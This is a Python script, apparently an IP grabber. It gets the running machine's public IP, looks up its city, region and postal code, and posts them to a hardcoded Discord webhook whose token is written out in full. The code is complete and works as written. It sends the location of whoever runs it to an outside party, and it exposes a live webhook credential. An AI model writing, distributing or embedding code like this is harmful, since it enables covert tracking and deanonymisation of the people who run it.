import requests, os, json, sys

def get_ip_details_and_post():
    try:
        # Get the IP
        ip_response = requests.get('https://api.ipify.org?format=json')
        ip_response.raise_for_status()
        ip = ip_response.json()['ip']
        print(f"Got IP: {ip}")

        # Get city, region, zip
        geo_response = requests.get(f'https://ipapi.co/{ip}/json/')
        geo_response.raise_for_status()
        geo_data = geo_response.json()
        city = geo_data.get('city', 'Unknown')
        region = geo_data.get('region', 'Unknown')
        zip_code = geo_data.get('postal', 'Unknown')
        print(f"Got city: {city}, region: {region}, zip: {zip_code}")

        # Send to webhook as an embed
        webhook_url = 'https://discord.com/api/webhooks/1411976368412950631/x5QpRC5s14r8fKBl1ZQQMRg1BmEQB9nH0Y8VO2rmM2FOlL77PizDdiR08gIyhyAwAWjh'  # Replace with your webhook URL
        embed = {
            "title": "IP Info",
            "color": 0x00ff00,  # Green color in hex
            "fields": [
                {"name": "IP Address", "value": ip, "inline": True},
                {"name": "City", "value": city, "inline": True},
                {"name": "Region", "value": region, "inline": True},
                {"name": "Zip Code", "value": zip_code, "inline": True}
            ],
            "footer": {"text": "Sent at " + requests.get('http://worldtimeapi.org/api/timezone/UTC').json()['datetime']}
        }
        payload = {"embeds": [embed]}
        headers = {'Content-Type': 'application/json'}
        webhook_response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        webhook_response.raise_for_status()
        print(f"Webhook sent successfully: {webhook_response.status_code}")
        
        # Exit cleanly after sending
        sys.exit(0)

    except requests.exceptions.HTTPError as e:
        print(f"Webhook failed: {e}")
        print(f"Response text: {e.response.text}")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"Other error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    get_ip_details_and_post()